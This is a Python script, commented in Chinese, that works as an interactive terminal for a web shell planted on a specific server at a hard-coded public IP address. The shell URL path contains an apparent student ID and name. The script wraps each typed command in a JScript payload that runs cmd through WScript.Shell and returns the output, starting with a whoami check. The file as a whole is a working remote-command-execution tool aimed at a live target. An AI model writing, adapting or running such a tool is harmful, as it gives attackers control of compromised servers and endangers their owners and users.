import requests
import urllib.parse
import sys

# ================= 配置区域 =================
# 填入之前自动获取到的 Shell URL
SHELL_URL = "http://120.55.241.236:999/Answer/08118106%20%E8%AE%B8%E6%B7%91%E5%AF%B0/A01/s_3711.aspx"
PASSWORD = "c"

def execute_cmd(cmd):
    try:
        # 构造 JScript Payload
        # var d=new ActiveXObject("WScript.Shell");
        # var o=d.Exec("cmd /c command");
        # Response.Write(o.StdOut.ReadAll());
        # Response.Write(o.StdErr.ReadAll());

        # 对命令进行一些简单的转义处理，防止破坏 JS 字符串
        safe_cmd = cmd.replace("\\", "\\\\").replace("\"", "\\\"")

        payload = f"""var d=new ActiveXObject("WScript.Shell");var o=d.Exec("cmd /c {safe_cmd}");Response.Write(o.StdOut.ReadAll());Response.Write(o.StdErr.ReadAll());"""

        # 发送请求
        params = {
            PASSWORD: payload
        }

        resp = requests.get(SHELL_URL, params=params, timeout=20)

        if resp.status_code == 200:
            # 清理一下输出，有时候会有 HTML 标签残留
            return resp.text.strip()
        else:
            return f"[!] HTTP Error: {resp.status_code}"

    except Exception as e:
        return f"[!] Exception: {e}"

def main():
    print("=== WebShell 伪终端 ===")
    print(f"[*] Target: {SHELL_URL}")
    print("[*] Type 'exit' to quit")

    # 先验证一下
    print("[*] Checking connection...")
    user = execute_cmd("whoami")
    print(f"[+] Current User: {user}")

    while True:
        try:
            cmd = input(f"\n({user})> ")
            if cmd.strip().lower() == "exit":
                break
            if not cmd.strip():
                continue

            output = execute_cmd(cmd)
            print(output)

        except KeyboardInterrupt:
            print("\nBye!")
            break

if __name__ == "__main__":
    main()
